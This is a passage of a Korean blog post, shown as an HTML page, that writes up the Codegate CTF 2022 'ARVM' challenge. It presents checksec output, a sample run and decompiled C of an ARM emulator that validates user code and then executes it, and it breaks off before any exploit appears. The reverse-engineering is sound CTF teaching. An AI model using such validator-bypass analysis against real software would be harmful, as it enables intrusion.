@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"juhyun167.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="개요  Welcome! Here is my Emulator. It can use only human. Always SMiLEY 😃  chall.zip 문제 분석 32비트 ARM 바이너리 app 과 Dockerfile , run.sh 등이 주어집니다. run.sh 파일에서 바이너리는 qemu-arm-static 으로 에뮬레이션하여 실행됨을 확인할 수 있습니">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Codegate CTF 2022] ARVM">
+<meta property="og:url" content="https://juhyun167.github.io/2022/07/03/codegate22-arvm/index.html">
+<meta property="og:site_name" content="JUHYUN167">
+<meta property="og:description" content="개요  Welcome! Here is my Emulator. It can use only human. Always SMiLEY 😃  chall.zip 문제 분석 32비트 ARM 바이너리 app 과 Dockerfile , run.sh 등이 주어집니다. run.sh 파일에서 바이너리는 qemu-arm-static 으로 에뮬레이션하여 실행됨을 확인할 수 있습니">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-07-03T11:26:07.000Z">
+<meta property="article:modified_time" content="2022-07-03T14:59:25.574Z">
+<meta property="article:author" content="juhyun167 블로그">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://juhyun167.github.io/2022/07/03/codegate22-arvm/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://juhyun167.github.io/2022/07/03/codegate22-arvm/","path":"2022/07/03/codegate22-arvm/","title":"[Codegate CTF 2022] ARVM"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[Codegate CTF 2022] ARVM | JUHYUN167</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2NL1HJ159T"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-2NL1HJ159T","only_pageview":false}</script>
+  <script src="/js/third-party/analytics/google-analytics.js"></script>
+
+
+
+
+<!-- custom fonts -->
+<link rel="stylesheet" as="style" crossorigin href="https://cdn.jsdelivr.net/gh/orioncactus/pretendard/dist/web/static/pretendard-dynamic-subset.css" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+<!-- google search console -->
+<meta name="google-site-verification" content="pV2zNbKpqSdeajzc7IIefYq62vg-J9PCZfCvLKwnYF8" />
+<!-- naver search advisor -->
+<meta name="naver-site-verification" content="e4b3b4646981d90b2cfdab4014543ed9338b4e57" />
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/rss2.xml" title="JUHYUN167" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+      <img class="custom-logo-image" src="/images/custom-logo.png" alt="JUHYUN167">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">JUHYUN167</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Elegant and powerful theme for Hexo</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+<!-- load header custom script -->
+<script src="/scripts/header.js"></script>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">juhyun167 블로그</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+
+<ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Computer-Science/">Computer Science</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Computer-Science/Data-Structures/">Data Structures</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Security/">Security</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Security/ARM-Exploitation/">ARM Exploitation</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Security/CTF/">CTF</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Thoughts/">Thoughts</a><span class="category-list-count">2</span></li></ul>
+
+<!-- load sidebar custom script -->
+<script src="/scripts/sidebar.js"></script>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://juhyun167.github.io/2022/07/03/codegate22-arvm/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="juhyun167 블로그">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JUHYUN167">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[Codegate CTF 2022] ARVM | JUHYUN167">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [Codegate CTF 2022] ARVM
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-07-03 11:26:07 / Modified: 14:59:25" itemprop="dateCreated datePublished" datetime="2022-07-03T11:26:07+00:00">2022-07-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Security/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
+<blockquote>
+<p>Welcome! Here is my Emulator. It can use only human.<br>
+Always SMiLEY 😃</p>
+</blockquote>
+<p><a href="/uploads/codegate22-arvm/chall.zip">chall.zip</a></p>
+<h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">문제 분석</h2>
+<p>32비트 ARM 바이너리 <code>app</code> 과 <code>Dockerfile</code> , <code>run.sh</code> 등이 주어집니다. <code>run.sh</code> 파일에서 바이너리는 <code>qemu-arm-static</code> 으로 에뮬레이션하여 실행됨을 확인할 수 있습니다. 바이너리는 심볼이 strip되어 있고, NX, canary 보호 기법이 적용되어 있습니다.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec app</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/codegate22/arvm/app&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
+<p>바이너리를 실행하면 코드를 입력받고, 3가지의 메뉴가 주어집니다. 코드를 입력하고 '1. Run Code’를 선택하면 바이너리가 출력하는 Secret code를 똑같이 입력해야 하는데, 앞서 코드로 “111” 을 입력했더니 “Instruction 0xa31313131 is invalid” 메시지와 함께 종료됩니다.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-arm-static -L /usr/arm-linux-gnueabi ./app</span><br><span class="line">Running Emulator...</span><br><span class="line">Welcome Emulator</span><br><span class="line">Insert Your Code :&gt; 111</span><br><span class="line">1. Run Code</span><br><span class="line">2. View Code</span><br><span class="line">3. Edit Code</span><br><span class="line">:&gt; 1</span><br><span class="line">Before run, it has some captcha</span><br><span class="line">Secret code : 0x52bae0cd</span><br><span class="line">Code? :&gt; 0x52bae0cd</span><br><span class="line">Instruction 0xa313131 is invalid</span><br></pre></td></tr></table></figure>
+<p><code>main</code> 함수를 살펴보면 다음과 같습니다. 13행에서 <code>setup</code> 함수를 호출하여 필요한 구조체와 메모리를 할당하고, 17행에서 <code>edit_code</code> 함수를 호출하여 코드를 입력받습니다. 53행에서 호출하는 <code>check_code</code> 함수의 리턴값이 -1이 아니면 56~61행에서 입력한 코드를 실행하는데, <code>R0</code> 부터 <code>R12</code> 까지 모두 0으로 초기화하는 코드를 앞에 덧붙인 후 실행합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> captcha; <span class="comment">// [sp+4h] [bp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [sp+8h] [bp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [sp+Ch] [bp-28h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [sp+10h] [bp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [sp+14h] [bp-20h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [sp+1Ch] [bp-18h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// [sp+2Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = &amp;_stack_chk_guard;</span><br><span class="line">  <span class="keyword">if</span> ( setup() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( loading() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( edit_code() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">16u</span>);</span><br><span class="line">    choice = atoi(s);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">1</span> )                          <span class="comment">// 1. Run Code</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">2</span> )                          <span class="comment">// 2. View Code</span></span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, em-&gt;code, <span class="number">4096u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">3</span> )                     <span class="comment">// 3. Edit Code</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( loading() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( edit_code() == <span class="number">-1</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  captcha = <span class="number">0</span>;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  read(fd, &amp;captcha, <span class="number">4u</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Before run, it has some captcha&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Secret code : 0x%x\n&quot;</span>, captcha);</span><br><span class="line">  input = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Code? :&gt; &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;0x%x&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( captcha != input )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are Robot!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( check_code() == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good! Now Execute Real Machine&quot;</span>);</span><br><span class="line">  dest = <span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, em-&gt;code, <span class="number">4096u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(em-&gt;code, <span class="number">0</span>, <span class="number">4096u</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(em-&gt;code, &amp;clear_regs_code, <span class="number">52u</span>);      <span class="comment">// mov &#123;r0-r12&#125;, 0</span></span><br><span class="line">  v0 = <span class="built_in">memcpy</span>(em-&gt;code + <span class="number">52</span>, dest, <span class="number">4044u</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">void</span> *))em-&gt;code)(v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>setup</code> 함수는 <code>emulator</code> 구조체 변수 <code>em</code> 과 <code>reg</code> 구조체, 각종 메모리를 할당합니다. <code>emulator</code> 구조체는 <code>mmap</code> 시스템 콜로 할당한 코드, 힙, 스택 역할을 하는 메모리의 주소와 <code>reg</code> 구조체 포인터를 멤버로 가집니다. <code>reg</code> 구조체는 범용 레지스터들과 <code>CPSR</code> 레지스터 역할을 하는 정수형 변수 17개를 멤버로 가집니다. 할당 이후 <code>em-&gt;reg-&gt;pc</code> , <code>em-&gt;reg-&gt;sp</code> 를 각각 <code>em-&gt;code</code> , <code>em-&gt;stack</code> 으로 초기화합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setup</span><span class="params">()</span> <span class="comment">// 0x1088c</span></span><br><span class="line">&#123;</span><br><span class="line">  emulator *v1; <span class="comment">// r4</span></span><br><span class="line">  emulator *v2; <span class="comment">// r4</span></span><br><span class="line">  emulator *v3; <span class="comment">// r4</span></span><br><span class="line">  emulator *v4; <span class="comment">// r4</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf((FILE *)<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  em = (emulator *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">16u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v1 = em;</span><br><span class="line">  v1-&gt;code = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x1000</span>, <span class="number">4096u</span>, <span class="number">7</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;code )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v2 = em;</span><br><span class="line">  v2-&gt;heap = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x2000</span>, <span class="number">4096u</span>, <span class="number">3</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;heap )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v3 = em;</span><br><span class="line">  v3-&gt;<span class="built_in">stack</span> = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x3000</span>, <span class="number">4096u</span>, <span class="number">3</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;<span class="built_in">stack</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v4 = em;</span><br><span class="line">  v4-&gt;reg = (<span class="keyword">struct</span> reg *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">68u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;reg )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  em-&gt;reg-&gt;pc = (<span class="type">unsigned</span> <span class="type">int</span>)em-&gt;code;</span><br><span class="line">  em-&gt;reg-&gt;sp = (<span class="type">unsigned</span> <span class="type">int</span>)em-&gt;<span class="built_in">stack</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">emulator</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">reg</span> *<span class="title">reg</span>;</span></span><br><span class="line">  <span class="type">char</span> *<span class="built_in">stack</span>;</span><br><span class="line">  <span class="type">char</span> *code;</span><br><span class="line">  <span class="type">char</span> *heap;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sp, lr, pc, cpsr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><code>edit_code</code> 함수는 <code>em-&gt;code</code> 주소에 실행할 코드를 입력받는데, 길이가 4의 배수가 아니면 -1을 반환합니다. 이 경우 <code>main</code> 함수에서 <code>exit(-1)</code> 을 호출하여 종료합니다. 입력받은 후 <code>exit</code> 시스템 콜을 호출하는 코드를 뒤에 덧붙입니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit_code</span><span class="params">()</span> <span class="comment">// 0x10af0</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> len; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  len = read(<span class="number">0</span>, em-&gt;code, <span class="number">4031u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (len &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;em-&gt;code[len], &amp;exit_code, <span class="number">12u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>check_code</code> 함수는 반복문을 돌면서 <code>em-&gt;reg-&gt;pc</code> 로부터 4바이트씩 인스트럭션 <code>inst</code> 를 읽습니다. <code>check_cpsr</code> 함수를 <code>inst</code> 를 인자로 호출하여 리턴값이 0이 아니면, switch-case 구문으로 인스트럭션의 클래스에 해당하는 <code>check_*</code> 함수를 호출합니다. <code>check_cpsr</code> 함수가 0을 리턴하거나 <code>check_*</code> 함수가 -1을 리턴하는 경우 <code>sigill</code> 함수를 호출하는데, 이 함수는 오류 메시지를 출력하고 <code>exit(-1)</code> 로 프로그램을 종료합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_code</span><span class="params">()</span> <span class="comment">// 0x10bb0</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> op1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> inst; <span class="comment">// [sp+0h] [bp-Ch]</span></span><br><span class="line">  <span class="type">int</span> fetched; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( inst = <span class="number">-1</span>; em-&gt;reg-&gt;pc &lt; (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">4096</span>); inst = fetched )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> 